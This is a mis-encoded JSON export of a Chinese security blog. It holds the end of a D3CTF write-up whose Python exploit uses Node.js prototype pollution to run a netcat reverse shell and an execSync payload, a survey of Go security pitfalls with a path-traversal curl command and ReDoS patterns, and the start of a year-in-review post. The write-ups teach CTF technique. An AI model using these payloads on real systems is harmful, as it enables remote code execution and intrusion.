ã€‚è¿™é‡Œéƒ½å¾ˆå¥½é…ç½®ï¼Œç¨å¾®éœ€è¦æ³¨æ„çš„æ˜¯smtpæœåŠ¡å™¨çš„è®¾ç½®ã€‚æˆ‘ä»¬ç›´æ¥çœ‹å®˜æ–¹æ–‡æ¡£ https://nodemailer.com/about/ æŒ‰ç…§å®˜æ–¹çš„é…ç½®ç›´æ¥https://nodemailer.com/about/ åˆ›ç«‹ä¸€ä¸ªè´¦æˆ·ã€‚å°±å¯ä»¥è·‘èµ·æ¥äº† ç„¶åæŒ‰ç…§ä¸Šé¢çš„åˆ©ç”¨é“¾,å†™expæ‰“ä¸€ä¸‹ï¼Œæœ¬åœ°å¾ˆå¿«é€šäº†ï¼Œè¿œç¨‹çš„è¯æ‰¾äº†ä¸‹åªèƒ½ncå¼¹shellæ¯”è¾ƒæ–¹ä¾¿ã€‚ 123456789101112131415161718192021222324import requestss = requests.session()r = s.post('http://ce775e2992.8bit-pub.d3ctf.io/user/signin', json=&#123; 'username': 'admin', 'password': &#123; 'password': 1 &#125;&#125;, cookies=&#123; 'session': 's%3Asis-4wQQfN9QjaqEJAhBIL4iPP_e-qnr.p1CqQc3RiekkFz5FYzBRR9%2BO3j%2FIUX0vPh2sdkcuMk8'&#125;)print(r.json())r = s.post('http://ce775e2992.8bit-pub.d3ctf.io/admin/email', json=&#123; 'from': \"admin@123.com\", 'to': 'j3c9g.tls@inbox.testmail.app', 'contents': \"bycbycbyc\", \"constructor.prototype.sendmail\": True, \"constructor.prototype.path\": \"/bin/sh\", \"constructor.prototype.args\": [\"-c\", \"nc xxx 9001 -e /bin/sh\"],&#125;, cookies=&#123; 'session': \"s%3Asis-4wQQfN9QjaqEJAhBIL4iPP_e-qnr.p1CqQc3RiekkFz5FYzBRR9%2BO3j%2FIUX0vPh2sdkcuMk8\"&#125;)print(r.json()) å½“ç„¶ã€‚å¦‚æœä¸æƒ³æ‰¾æ±¡æŸ“åˆ°rceçš„å±æ€§æ—¶ï¼Œè¿˜æœ‰ä¸€ä¸ªé€šæ³•ã€‚å°±æ˜¯æˆ‘åœ¨NCTF2020 ä¸­å‡ºçš„packagemanager_v2.0 é‡Œçš„åˆ©ç”¨ å½“æ—¶æåˆ°è¿‡äº†ã€‚åˆ°åŸºç±»çš„æ±¡æŸ“+ ä»»æ„å­è¿›ç¨‹ = RCEã€‚è¿™é‡Œæ— è„‘ç›´æ¥æ±¡æŸ“ç¯å¢ƒå˜é‡å½“ç„¶æ˜¯å¯ä»¥çš„ æ”¹ä¸‹å°±è¡Œ 1234\"constructor.prototype.sendmail\": True,\"constructor.prototype.shell\":\"node\",\"constructor.prototype.env.NODE_DEBUG\": \"require('child_process').execSync('curl 127.0.0.1');process.exit();//\",\"constructor.prototype.env.NODE_OPTIONS\":\"-r /proc/self/environ\", è¿œç¨‹ncæ‰“é€š ç”±äºé¢˜ç›®æ‰“ä¸€æ¬¡åæ•°æ®åº“å°±ä¼šæŠ¥é”™,åªè¦å®Œæˆç¬¬ä¸€æ­¥ä»¥adminç™»å½•çš„é€‰æ‰‹åº”è¯¥éƒ½èƒ½åœ¨ç™»å½•æ—¶çœ‹åˆ°ä»–äººçš„payloadã€‚æ‰€ä»¥å¯èƒ½ä¼šæœ‰è¹­è½¦ã€‚ summaryæ€»çš„æ¥è¯´è¿™é“é¢˜éš¾åº¦ä¸€èˆ¬ã€‚ä½†æ˜¯åˆ©ç”¨ç‚¹å…¶å®éƒ½æ˜¯æ¯”è¾ƒç»å…¸çš„ã€‚æ‰€ä»¥å€¼å¾—åˆ†äº«ä¸€ä¸‹ã€‚ä¹Ÿæé†’æˆ‘ä»¬ä»å¼€å‘çš„è§’åº¦ä¸Šï¼Œä¸€æ–¹é¢åœ¨æ‰“å¼€äº†jsonä¸­é—´ä»¶æˆ–è€…{extendedï¼š true}çš„æƒ…å†µä¸‹ä¸€å®šè¦æ³¨æ„ä¼ å‚ç±»å‹ã€‚å¦ä¸€æ–¹é¢ä¹Ÿæ˜¯é¿å…ä½¿ç”¨ç”¨é‡ä½çš„nodeä¾èµ–,å¦åˆ™å¯èƒ½ä¼šå­˜åœ¨ä¸€äº›æœªä¿®å¤å®Œå…¨æˆ–è€…ç”šè‡³æ ¹æœ¬ä¸ä¿®å¤çš„ä»£ç ã€‚æ¯”å¦‚ æ­¤å¤„æ²¡ä¿®å¤å®Œå…¨çš„shvl çš„æƒ…å½¢ç”šè‡³éƒ½ä¸æ˜¯ä¸ªä¾‹ã€‚ä¹‹å‰ posixæŒ–åˆ°çš„flat ä¾èµ– åŸå‹é“¾æ±¡æŸ“ç¬¬ä¸€æ¬¡ä¿®å¤çš„ç‰ˆæœ¬è·Ÿè¿™é‡Œå‡ºç°äº†å‡ ä¹ä¸€æ ·çš„é—®é¢˜,å¯¼è‡´å¯ä»¥prototypeç»•è¿‡ã€‚ã€‚ã€‚ æœ€åå°±æ˜¯å…³äºRCEã€‚ nodejsé‡Œæƒ³å€Ÿç”±æ¼æ´è¾¾æˆRCEç¡®å®ä¸æ˜¯ä¸€ä»¶ç®€å•çš„äº‹æƒ…ï¼ŒåŸºæœ¬ä¸Šå°±å‚æ•°æ³¨å…¥ï¼Œæˆ–è€…åŸå‹é“¾æ±¡æŸ“ + gadget/ AST injection. è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåŸå‹é“¾æ±¡æŸ“å§‹ç»ˆæ˜¯nodejsæ¼æ´çƒ­é—¨çš„åŸå› ã€‚ ä¹‹å‰æ³¨æ„åˆ°posixä»–ä»¬å·²ç»ç ”ç©¶å‡ºäº†è‡ªåŠ¨æŒ–æ˜åŸå‹é“¾æ±¡æŸ“çš„å·¥å…·äº†,å±å®ç¾¡æ…•ã€‚ã€‚ã€‚","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"},{"name":"Node.js","slug":"Node-js","permalink":"https://www.bycsec.top/tags/Node-js/"}]},{"title":"golangçš„ä¸€äº›å®‰å…¨é—®é¢˜","slug":"golangçš„ä¸€äº›å®‰å…¨é—®é¢˜","date":"2021-02-07T13:56:47.000Z","updated":"2021-02-18T05:09:03.594Z","comments":true,"path":"2021/02/07/golangçš„ä¸€äº›å®‰å…¨é—®é¢˜/","link":"","permalink":"https://www.bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/","excerpt":"å¯’å‡ä¸»è¦æ˜¯å…ˆå‡ºå®Œäº†ä¹‹å‰å¿ƒå¿ƒå¿µå¿µçš„typescript é¢˜ç›®ï¼Œä¹‹åä¸»è¦æ˜¯æŠ½ç‚¹æ—¶é—´å­¦golang.åŒå­¦æ¨èçš„ä»“åº“è®²çš„è¿˜æ˜¯å¾ˆä¸é”™çš„ https://github.com/unknwon/the-way-to-go_ZH_CN ä»ç®€å•çš„å¼€å‘ä¸å­¦ä¹ è¿‡ç¨‹ä¸­å¯ä»¥æ„Ÿè§‰åˆ°golangçš„ç¡®éå¸¸å®‰å…¨ï¼Œå¾ˆå¤šé—®é¢˜ç”±äºä½œä¸ºå¼ºç±»å‹çš„é™æ€è¯­è¨€ï¼Œä»ç¼–è¯‘è¿‡ç¨‹å°±èƒ½é˜²æ­¢ä¸å®‰å…¨çš„æ“ä½œã€‚å› æ­¤å¤§éƒ¨åˆ†æ¼æ´äº§ç”Ÿè¿˜æ˜¯å½’ç»“äºä¾èµ–åº“ï¼ˆé€šå¸¸å·²ç»å‘å±•ä¸ºCVEæˆ–è€…issueï¼‰ä»¥åŠå¼€å‘è€…è‡ªèº«çš„æ“ä½œæ¼æ´ã€‚è¿™é‡Œå°±ä½œä¸ºå°ç»“,ç®€å•è°ˆä¸€è°ˆ","text":"å¯’å‡ä¸»è¦æ˜¯å…ˆå‡ºå®Œäº†ä¹‹å‰å¿ƒå¿ƒå¿µå¿µçš„typescript é¢˜ç›®ï¼Œä¹‹åä¸»è¦æ˜¯æŠ½ç‚¹æ—¶é—´å­¦golang.åŒå­¦æ¨èçš„ä»“åº“è®²çš„è¿˜æ˜¯å¾ˆä¸é”™çš„ https://github.com/unknwon/the-way-to-go_ZH_CN ä»ç®€å•çš„å¼€å‘ä¸å­¦ä¹ è¿‡ç¨‹ä¸­å¯ä»¥æ„Ÿè§‰åˆ°golangçš„ç¡®éå¸¸å®‰å…¨ï¼Œå¾ˆå¤šé—®é¢˜ç”±äºä½œä¸ºå¼ºç±»å‹çš„é™æ€è¯­è¨€ï¼Œä»ç¼–è¯‘è¿‡ç¨‹å°±èƒ½é˜²æ­¢ä¸å®‰å…¨çš„æ“ä½œã€‚å› æ­¤å¤§éƒ¨åˆ†æ¼æ´äº§ç”Ÿè¿˜æ˜¯å½’ç»“äºä¾èµ–åº“ï¼ˆé€šå¸¸å·²ç»å‘å±•ä¸ºCVEæˆ–è€…issueï¼‰ä»¥åŠå¼€å‘è€…è‡ªèº«çš„æ“ä½œæ¼æ´ã€‚è¿™é‡Œå°±ä½œä¸ºå°ç»“,ç®€å•è°ˆä¸€è°ˆ interger overflow/truncationgolang å­˜åœ¨éå¸¸ç»å…¸çš„æ•´æ•°åè½¬/æº¢å‡ºé—®é¢˜ å¯¹æ— ç¬¦å·æ•°çš„åè½¬ 123456789func main() &#123; var a uint32 = 2147483648 var b uint32 = 2147483648 var sum = a + b fmt.Println(reflect.TypeOf(sum)) fmt.Printf(\"Sum is : %d\",sum)&#125;//uint32//Sum is : 0 æƒ³è¦ç›´æ¥å£°æ˜ä¸€ä¸ªå¤§å°å·²ç»æº¢å‡ºçš„æ•°è‡ªç„¶ä¸ä¼šé€šè¿‡ç¼–è¯‘ï¼Œå› æ­¤å‡ºç°åè½¬çš„è¯ï¼Œä¸»è¦æ˜¯åœ¨å˜é‡çš„ç›¸åŠ è¿™æ ·çš„è®¡ç®—æ‰ä¼šä¼šå¯¼è‡´æ ‡å¿—CFä½åè½¬ æœ‰ç¬¦å·æ•°çš„æº¢å‡º 1234567var a int8 = 127var b int8 = 1var sum int8 = a + bfmt.Println(reflect.TypeOf(sum))fmt.Printf(\"Sum is : %d\",sum)//int8//-128 å…·ä½“çš„å€¼å¯ä»¥çœ‹åˆ°mathåŒ…ä¸­çš„å¸¸é‡å®šä¹‰ã€‚ åœ¨ç±»å‹è½¬æ¢ä¸­,ä¹Ÿä¼šå‡ºç°è¾ƒå¤§æ•´å‹å‘è¾ƒå°æ•´å‹è½¬æ¢çš„æˆªæ–­é—®é¢˜ 12345var a int16 = 256var b = int8(a)fmt.Println(b)// 0 // high-order byte is truncated æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ•´å‹å®‰å…¨çš„æ£€æŸ¥ä¹Ÿå‡ºç°åœ¨äº†gosecä¸­ï¼Œä¸€ä¸ªæ¯”è¾ƒç»å…¸çš„ä¾‹å­å°±æ˜¯ï¼škubectlå‘½ä»¤è¡Œä¸­å‡ºç°äº†ä¸€ä¸ªstrconv.Atoiå¯¼è‡´çš„æˆªæ–­é—®é¢˜ã€‚å½“æˆ‘ä»¬ä¼ å…¥portå‚æ•°çš„å¯¹åº”å­—ç¬¦ä¸²å,å®¹å™¨å¯åŠ¨çš„ç«¯å£è¿™ä¸€å‚æ•°ä¼šå°†ç»Atoiå¤„ç†åçš„å­—ç¬¦ä¸²è¿›è¡Œint32çš„ç±»å‹è½¬æ¢ã€‚ç”±äº64ä½ç³»ç»Ÿçš„intæ˜¯int64ç±»å‹ã€‚è½¬int32çš„è¯ä¼šå‡ºç°æ˜æ˜¾æˆªæ–­å¯ä»¥ç®€åŒ–æˆä»¥ä¸‹ä»£ç ï¼š 1234v , _ := strconv.Atoi(\"4294967377\")s := int32(v)fmt.Println(s)// 81 è¿™æ ·å°±æœ‰å¯èƒ½å¯¼è‡´81ç«¯å£çš„æœåŠ¡å¯åŠ¨ï¼Œæˆ–è€…è¢«åœæ­¢ã€‚æ‰€ä»¥ä½¿ç”¨ParseInt ,ParseUIntä¼šæ¯”è¾ƒå¥½ã€‚æˆ–è€…å¯¹ç«¯å£å·è¿›è¡Œé™åˆ¶ã€‚ CTFä¸­å‡ºç°æ•´æ•°æº¢å‡ºçš„scenario ä¸€èˆ¬éƒ½æ˜¯ xx shopä¹‹ç±»çš„ã€‚é€šè¿‡é‡å¤çš„åŠ æ•°è¿›è¡Œæº¢å‡ºç„¶åé‰´æƒã€‚ pseudo-randgolang çš„math/rand åŒ…ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°éšæœºæ•°ç”Ÿæˆçš„å‡½æ•°å½¢å¼ è·Ÿè¿›ä¸€ä¸‹å‡½æ•°ä¸ç»“æ„ä½“ 123456789var globalRand = New(&amp;lockedSource&#123;src: NewSource(1).(*rngSource)&#125;)......func NewSource(seed int64) Source &#123; var rng rngSource rng.Seed(seed) return &amp;rng&#125; å¯ä»¥çœ‹åˆ°,è¿™äº›éšæœºæ•°å‡½æ•°çš„seedé»˜è®¤ä¸º1.ä¹Ÿå°±æ˜¯è¯´å¦‚æœä¸ä½¿ç”¨rand.Seed()ç¡®è®¤ç§å­çš„è¯ï¼Œç”Ÿæˆçš„åªæ˜¯æ‰€è°“çš„ä¼ªéšæœºæ•°ã€‚ è¿™ç§é—®é¢˜å¯èƒ½ä¼šå‡ºç°åœ¨å¼€å‘è€…ç›´æ¥ç”¨randç”Ÿæˆçš„å­—ç¬¦ä¸²ä½œä¸ºå¯†é’¥çš„åœºæ™¯ï¼Œæ¯”å¦‚ginçš„cookieçš„key.ä»è€Œå¯¼è‡´æœ¬åœ°å¤ç°ï¼Œç›´æ¥é‰´æƒã€‚ go net/httpnet/http &lt; 1.11 CRLFä½ç‰ˆæœ¬çš„httpåº“ä¼šå¯¼è‡´CRLF.æ¯”å¦‚http.NewRequest()ã€‚è²Œä¼¼æ˜¯åŸæœ¬æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯åœ¨ä¸€æ¬¡å‡çº§ä¸­ç–å¿½äº†å¯¼è‡´é‡æ–°å‡ºç° ç°åœ¨ä¼šçœ‹åˆ°å­˜åœ¨é™åˆ¶ï¼Œæˆ‘ä»¬æ— æ³•ä¼ å…¥\\r\\nçš„å­—ç¬¦ WMCTFä¸­çš„gogogoå‡ºç°è¿‡è¿™ä¸€æ¼æ´ï¼Œåˆ©ç”¨è‡ªç„¶æ˜¯é€šè¿‡CRLFå‘é€POSTè¯·æ±‚è¿›è¡Œç»•è¿‡ä¸ä¸Šä¼ ã€‚ weird stuffåœ¨ä¹‹å‰çš„justCTFä¸­ï¼Œå‡ºç°äº†ä¸€é“goé¢˜ã€‚é¢˜ç›®åŸæœ¬çš„æ¼æ´æ˜¯ç”±å‡ºé¢˜äººå‘ç°çš„ä¸€ä¸ªissuehttps://github.com/golang/go/issues/40940 åŠ ä¸Šå…¶å¯¹fileServerä¸€äº›ä»£ç çš„é­”æ”¹ç»„åˆçš„ã€‚ ç®€å•é™ˆè¿°ä¸‹çš„è¯ï¼Œé¢˜ç›®æä¾›äº†ä¸€ä¸ªgo httpèµ·çš„FileServer 1http.Handle(\"/\", http.FileServer(http.Dir(\"/tmp\"))) flagå°±åœ¨å…¶æä¾›æ–‡ä»¶æœåŠ¡çš„æ–‡ä»¶å¤¹ä¸‹ï¼Œä½†æ˜¯ï¼Œå‡ºé¢˜äººåŠ ä¸Šäº†webæœåŠ¡çš„flagè·¯ç”±,ä»è€Œä½¿å¾—æˆ‘ä»¬æ²¡æ³•é€šè¿‡ç›´æ¥è®¿é—®/flagæ¥è·å–æ–‡ä»¶ã€‚è€Œæ˜¯å¾—åˆ°/flagè·¯ç”±çš„å›æ˜¾ã€‚ å‡ºé¢˜äººçš„æ„å›¾æ˜¯åˆ©ç”¨å…¶æŒ–æ˜åˆ°çš„è¿™ä¸ªæ¼æ´ï¼Œé€ æˆé”™è¯¯çš„æ–‡ä»¶è¯»å–èŒƒå›´ã€‚é€šè¿‡è®¿é—®å…¶ä»–æ–‡ä»¶è¶Šç•Œè¯»åˆ°flag.(httpçš„Fileserveråœ¨æˆ‘ä»¬è®¿é—®æ—¶ï¼Œä¼šå…ˆæ ¹æ®æˆ‘ä»¬è®¿é—®çš„urlè¿›è¡Œä¸€ç³»åˆ—å¤„ç†ï¼Œæœç»è·¯å¾„ç©¿è¶Šçš„url,ä¹‹åè¿›è¡Œæ–‡ä»¶è¯»å–è¿”å›ç»™ç”¨æˆ·) ä½†æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„æ—¶ï¼Œæ¯”èµ›ä¸­å‡ºç°äº†ä¸€ä¸ªéé¢„æœŸè¯»flagçš„æ–¹å¼curl --path-as-is -X CONNECT http://gofs.web.jctf.pro/../flag ç®€å•è¯´å°±æ˜¯ç”¨CONNECTè¯·æ±‚+è·¯å¾„ç©¿è¶Šçš„urlè¯»å–åˆ°äº†æ–‡ä»¶ã€‚æˆ‘ä»¬çœ‹çœ‹æºç æ˜¯æ€ä¹ˆå¤„ç†çš„å¦‚æœæ˜¯CONNECTæ–¹å¼è¯·æ±‚ï¼Œå°±ä¸ä¼šå¤„ç†urlä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚å¯¼è‡´ç›´æ¥è¯»å–flag.å…¶ä»–çš„è¯·æ±‚æ–¹æ³•éƒ½ä¼šåœ¨cleanPathä¸­è¢«å¤„ç†url ç®—æ˜¯ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é—®é¢˜ã€‚ä¸è¿‡golang1.16ä¼¼ä¹å·²ç»å¤„ç†äº†ã€‚ä½†æ˜¯åŒ…æ‹¬æˆ‘åœ¨å†…çš„å¤§éƒ¨åˆ†åº”è¯¥è¿˜æ˜¯ä½¿ç”¨çš„go1.15åŠä»¥ä¸‹ç‰ˆæœ¬ï¼Œæ‰€ä»¥è¿˜æ˜¯å€¼å¾—æ³¨æ„çš„ feature of sliceä¹‹å‰åœ¨åšbuuä¸Šçš„roarCTFæ—¶é‡åˆ°ä¸€é“goé¢˜ï¼Œå…¶ä¸­ä¸€ä¸ªåˆ©ç”¨ç‚¹æ¥è‡ªConfidence CTF,å…¶ä¸­ç”¨åˆ°äº†golang sliceçš„ä¸€ä¸ªfeature 123456789101112131415a := make([]uint64, 0)a = append(a, 1)a = append(a, 2)a = append(a, 3)b := append(a, 4)c := append(a, 5)fmt.Println(a)fmt.Println(b)fmt.Println(c)//result://[1 2 3]//[1 2 3 5]//[1 2 3 5] æŒ‰ç…§ç›´è§‰æ¥è¯´ï¼Œbè¿™é‡Œåº”è¯¥æ˜¯[1,2,3,4],ä½†å®é™…ä¸Šå´æ˜¯[1,2,3,5]è¿™å°±ä¸golangçš„sliceä¹Ÿå°±æ˜¯åˆ‡ç‰‡çš„ç»“æ„ç›¸å…³äº† 12345type slice struct &#123; array unsafe.Pointer // ptr len int cap int&#125; sliceç»“æ„ä¸­çš„capæ˜¯æŒ‰2çš„å€æ•°æ‰©å®¹çš„ã€‚æ‰€ä»¥è¯´å½“æˆ‘ä»¬append(3)æ—¶ä¼šå‘ç”Ÿç¬¬ä¸€æ¬¡æ‰©å®¹ï¼Œæ­¤æ—¶lenä¸º3ï¼Œcapä¸º2*2=4.æ‰§è¡Œb := append(a, 4)æ—¶ï¼Œæˆ‘ä»¬çš„4ä¼šè¢«æ”¾åœ¨æŒ‡é’ˆptrçš„ç¬¬å››ä¸ªä½ç½®ã€‚ç„¶åè¿”å›ptr len=4 cap=4ç»™bã€‚ä¸è¿‡è¿™å¹¶æ²¡æœ‰æ”¹å˜açš„ç»“æ„ï¼ˆsliceåªæ˜¯æŒ‡å‘å†…å­˜çš„æŒ‡é’ˆï¼‰ä¹‹åè¿›è¡Œc := append(a, 5)æ—¶ï¼Œç”±äºaæ²¡å˜ï¼Œæ–°å…ƒç´ åªä¼šè¦†ç›–ä¹‹å‰bé‚£æ”¾ä¸Šçš„4. é‚£ä¸€é“é¢˜ç›®å°±æ˜¯åˆ©ç”¨è¿™ç‚¹ï¼Œå¯ä»¥é€šè¿‡å…ˆbegä¸‰æ¬¡æ„é€ å‡ºlen=3,cap=4çš„åˆ‡ç‰‡ï¼Œé€šè¿‡é¢˜ç›®ä¸­ä¸€ä¸ªappendè¶…å¤§éšæœºæ•°çš„æœºä¼šï¼Œåœ¨ä¸‹ä¸€æ¬¡begæ—¶è¾¾æˆå…ƒç´ è¦†ç›–ã€‚ è¿™ä¸ªå¯ä»¥ç®—æ˜¯sliceçš„feature,è¿˜æ˜¯å¾ˆæœ‰æ„æ€çš„ã€‚ reDOSåŸæœ¬æ˜¯ä»¥ä¸ºgolangä¸å­˜åœ¨reDOSçš„é—®é¢˜çš„ã€‚å½“åˆé˜…è¯»lmt-swallowçš„æ–‡ç« æ—¶ä¹Ÿçœ‹åˆ°ä»–æåˆ°golangæœ‰linear time matchingã€‚ ä¸è¿‡åæ¥å‘ç°è¿˜æ˜¯æœ‰é€”å¾„çš„ã€‚ å½“ç„¶ï¼ŒreDOSä¸»è¦è¿˜æ˜¯åœ¨jsé‡Œå½±å“æ¯”è¾ƒå¤§ï¼Œå› ä¸ºå…¶äº‹ä»¶é˜Ÿåˆ—é˜»å¡å¯¹äºwebæœåŠ¡çš„å½±å“æ˜¯å·¨å¤§çš„ã€‚ç›¸æ¯”ä¹‹ä¸‹å…¶ä»–çš„DOSå½±å“å¯èƒ½å°±è¾ƒå°ã€‚ç”¨nginxåšä¸ªå¤„ç†åŸºæœ¬å°±æ²¡æœ‰å½±å“ã€‚ä¸è¿‡ï¼Œå¦‚æœæ˜¯ä»¥Blind regex injectionä¸ºç›®çš„è€ƒè™‘reDOSçš„è¯ï¼Œå°±å¦å½“åˆ«è®ºäº†ã€‚ å›åˆ°golangä¸Šã€‚golangä½¿ç”¨çš„æ­£åˆ™å¼•æ“æ˜¯re2ã€‚ä½†æ˜¯ç”¨çš„æ˜¯æ— å›æº¯æœºåˆ¶(DFA)ã€‚æ‰€ä»¥ä¹‹å‰çš„payloadå¦‚^(?=(PAYLOAD))((.*)*)*salt$å°±æ— æ•ˆäº† ä½†æ˜¯,é€šè¿‡å…¶ä»–æ–¹æ³•åˆ¶é€ å»¶æ—¶ä»ç„¶æ˜¯å¯è¡Œçš„ã€‚æ¯”å¦‚re2å¯¹äº{n}è¿™æ ·çš„æ­£åˆ™ï¼Œnå­˜åœ¨æœ‰ä¸Šé™1000ï¼Œä¸”å¯¹äºDFAçŠ¶æ€æ•°æ²¡æœ‰é™åˆ¶.æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸æ–­é‡å¤(.?){1000}æ¥åˆ¶é€ è¶³å¤Ÿçš„DFAçŠ¶æ€è¿›è¡Œä¸€å®šç¨‹åº¦ä¸Šçš„å»¶æ—¶ reDOSå…¶å®ä¸€ç›´æ˜¯ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„ç‚¹,é™¤äº†å–œé—»ä¹è§çš„nodejs,å‰ç«¯ä¸­xssä¹Ÿå¯ä»¥å¯¼è‡´è¿™ä¸ªé—®é¢˜ï¼Œä»è€Œxsleak ,rubyä¸­ä¹Ÿæœ‰ç±»ä¼¼é—®é¢˜ã€‚å½“ç„¶ï¼Œå¦‚æœæ˜¯ä»reDOSå¼•ç”³åˆ°æ­£åˆ™ç›²æ³¨çš„è¯ï¼Œsqlæ³¨å…¥ä¸­å€’ä¹Ÿæœ‰ç±»ä¼¼çš„æƒ…å†µã€‚æ€»ä¹‹å°±æ˜¯åˆ©ç”¨å·®å¼‚æ€§è¿›è¡Œæ•°æ®æå–ã€‚å¯æƒœå› ä¸ºå¤ªå®¹æ˜“åç¯å¢ƒäº†ï¼Œæ‰€ä»¥å¾ˆéš¾å‡ºé“é¢˜åˆ°æ¯”èµ›ä¸­ :( SSTIæœ€åä¸€ä¸ªå°±ç®€å•æä¸€ä¸‹ssti.è¦è¯´golangè¿™ç§é™æ€ç¼–è¯‘è¿˜ä¼šå‡ºsstiè¿˜æ˜¯æŒºéš¾çš„( é™¤éæºç ä¸­ç”¨sprintf æˆ–è€…è¯´æ‹¼æ¥æ¥æ„å»ºtemplateçš„å‚æ•° 1var tmpl = fmt.Sprintf(`&lt;h2&gt;No search results for %s&lt;/h2&gt;`, xxx) golangçš„templateè·Ÿå¾ˆå¤šæ¨¡æ¿å¼•æ“çš„è¯­æ³•å·®ä¸å¤šï¼Œæ¯”å¦‚åŒèŠ±æ‹¬å·æŒ‡å®šå¯è§£æçš„å¯¹è±¡ã€‚.xxxè¡¨ç¤ºä¸€ä¸ªå¯¹è±¡çš„xxxå±æ€§ã€‚.å°±æ˜¯å½“å‰ä½œç”¨åŸŸçš„å½“å‰å¯¹è±¡ï¼ŒåŸºæœ¬å°±è·Ÿhandlebarsé‡Œçš„thiså·®ä¸å¤šã€‚ å‡å¦‚æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°æ˜¯å¯è§£æçš„,å°±æœ‰å¯èƒ½æ³„éœ²templateåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¼•å…¥çš„å¯¹è±¡å†…å®¹(æ‰§è¡Œçš„æœ¬è´¨å°±æ˜¯åˆå¹¶æ›¿æ¢) ç®€å•çš„demoå¯ä»¥å‚è€ƒè¿™é‡Œ https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html å¦‚æœä¼ å…¥çš„structå±æ€§å«æœ‰æŒ‡é’ˆçš„è¯(éå¸¸å¸¸è§ï¼Œå› ä¸ºç”¨æŒ‡é’ˆå¯ä»¥èŠ‚çœå¾ˆå¾ˆå¤šç©ºé—´),æˆ‘ä»¬sstiçš„å›æ˜¾å°±åªæ˜¯ä¸€ä¸ªåœ°å€ã€‚éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨å»è®¿é—®å±æ€§æ‰ä¼šè§£å¼• Summary &amp;&amp; Referenceç®€å•çš„æ¢³ç†ä¸‹è‡ªå·±è§è¿‡çš„golangå®‰å…¨é—®é¢˜(CTF-based web go)ã€‚å…¶å®åƒä¹‹å‰dasCTFä¸­ä¹Ÿæœ‰golangçš„é¢˜ç›®ï¼Œç”¨gobåºåˆ—åŒ–å­˜å†…å®¹åˆ°cookieï¼Œä¸è¿‡åˆ©ç”¨ç‚¹ä¸goçš„å…³ç³»ä¸º0ï¼Œæ‰€ä»¥ä¸è°ˆã€‚ è‡ªå·±golangçš„å¼€å‘è¿˜æœ‰å¾ˆå¤šå€¼å¾—å»å­¦çš„ï¼Œè¿™é—¨è¯­è¨€ç¡®å®æœ‰å…¶ä¼˜è¶Šä¹‹å¤„ä»¥åŠä¸€äº›å¯èƒ½å­˜åœ¨å¹¶è¢«æŒ–æ˜çš„å®‰å…¨é—®é¢˜ https://github.com/tsg-ut/tsgctf2020https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/https://github.com/golang/go/issues/30794https://github.com/golang/go/issues/40940https://github.com/mwarzynski/confidence2019_teaser_lottery","categories":[],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.bycsec.top/tags/Go/"}]},{"title":"Farewell to 2020","slug":"Farewell-to-2020","date":"2020-12-30T06:24:42.000Z","updated":"2021-02-18T05:09:00.622Z","comments":true,"path":"2020/12/30/Farewell-to-2020/","link":"","permalink":"https://www.bycsec.top/2020/12/30/Farewell-to-2020/","excerpt":"Time to say goodbye","text":"Time to say goodbye 2020é©¬ä¸Šå°±ç»“æŸäº†ã€‚æŒ‰å¾€å¹´çš„æƒ¯ä¾‹ï¼Œæ€»è¦å†™ç¯‡æ–‡ç« å›é¡¾ä¸‹è‡ªå·±ä¸€å¹´çš„ç»å†çš„ã€‚å› æ­¤å°±ç»§ç»­çŸ«æƒ…çš„è®°å½•ä¸‹å§ã€‚ è¿˜è®°å¾—1æœˆä»½åˆæ—¶ä¸€å †æœŸæœ«è€ƒè¯•æ‰å †ï¼Œå½“æ—¶æœŸæœ«æ€»å…±è€ƒäº†12é—¨ï¼Œäººéƒ½è€ƒå‚»äº†ã€‚æœ€å10å·æ—©ä¸Šé‡å­ç‰©ç†è€ƒå®Œç›´æ¥å†²å›å¯å®¤è·Ÿå®¤å‹ç©é¥¥è’æ”¾æ¾2333ã€‚ç„¶åç¬¬äºŒå¤©å°±å¼€å§‹åšylgç¾¤é‡Œå‘çš„code-breaking é¢˜ç›®è¿˜æœ‰ä¸€äº›ctfé¢˜ã€‚è€å®è¯´ï¼Œå½“æ—¶è¿˜å•¥éƒ½ä¸ä¼šï¼ŒåŸºæœ¬è‡ªå·±åšä¹Ÿä¸€è„¸æ‡µé€¼ã€‚ä¸è¿‡åæ­£ä»¥å‡†å¤‡æ•°æ¨¡ç¾èµ›ä¸ºç†ç”±ç•™åœ¨å­¦æ ¡äº†ï¼ˆç»“æœæ•°æ¨¡çŸ¥è¯†å•¥ä¹Ÿæ²¡å­¦XPï¼‰ï¼Œç„¶åå°±å¯ä»¥èŠ±å¾ˆé•¿æ—¶é—´çœ‹wp,å¤ç°ã€‚è¯´å®è¯æ”¶è·è¿˜æŒºå¤§çš„ã€‚ å½“æ—¶å®šäº†ä¸ªå°ç›®æ ‡ï¼Œå›æ­¦æ±‰å‰æ¯å¤©éƒ½æœ‰äº§å‡ºï¼Œè¿˜æ˜¯æŒºéš¾å¾—åšåˆ°äº†ã€‚ 